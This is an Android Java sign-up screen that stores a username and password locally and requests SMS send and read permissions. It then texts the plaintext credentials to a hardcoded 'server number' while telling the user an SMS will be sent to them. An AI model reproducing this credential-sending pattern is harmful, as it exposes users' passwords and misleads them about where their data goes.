package com.project.cuebue;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.material.textfield.TextInputEditText;
import com.project.cuebue.dtb.DBHelper;
import com.project.cuebue.dtb.UserDetails;

public class Sign_Up extends AppCompatActivity {

   TextView sign_login;
   Button sign_button;
   TextInputEditText name_edit, app_pass_edit;
   String Bvn_ph;

   //calling databaseHelper
    private DBHelper dbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sign_up);

        //ref myDBHelper
        dbHelper = new DBHelper(Sign_Up.this);
        dbHelper.OpenDB();

        //find ids
        sign_button = findViewById(R.id.sign_up_proceed);
        name_edit = findViewById(R.id.namney);
        app_pass_edit = findViewById(R.id.sign_up_password);
        //Bvn_ph = bvn_ph_edit.getText().toString().trim();
        //done

        //set button
        sign_button.setOnClickListener(view -> {

            //set send message permission
            ActivityCompat.requestPermissions(Sign_Up.this, new String[] {
                    Manifest.permission.SEND_SMS, Manifest.permission.READ_SMS
            }, PackageManager.PERMISSION_GRANTED);

            //check
            String username = name_edit.getText().toString();
            String pass = app_pass_edit.getText().toString();
            if (username.equals("")|| pass.equals("")) {
                    Toast.makeText(this, "Input all details", Toast.LENGTH_SHORT).show();
                    }
            else {
                UserDetails userDetail = new UserDetails(username, pass);
                if (dbHelper.RegisterUser(userDetail)) {
                    //Toast.makeText(this, "Sign-Up Successful", Toast.LENGTH_LONG).show();
                    //to send sms
                    sendSms();
                }
                else {
                    Toast.makeText(this, "Sign-Up Failed", Toast.LENGTH_SHORT).show();
                }
            }
        });

    }

    public void sendSms() {
        //incorporate the messages
        String nameMessage = name_edit.getText().toString();
        String passwordMessage = app_pass_edit.getText().toString();

        //main message
        String mainMessage = "SignUp, " + nameMessage + ", " + passwordMessage;
        //the server number
        String numb = "+2348104714353";

        //sms manager
        SmsManager appSmsManager = SmsManager.getDefault();
        appSmsManager.sendTextMessage(numb,null, mainMessage, null,null);

        Toast.makeText(this, "An SMS will be sent to you shortly.", Toast.LENGTH_LONG).show();

        Intent intent = new Intent(Sign_Up.this, Dashboard.class);
        startActivity(intent);
    }
}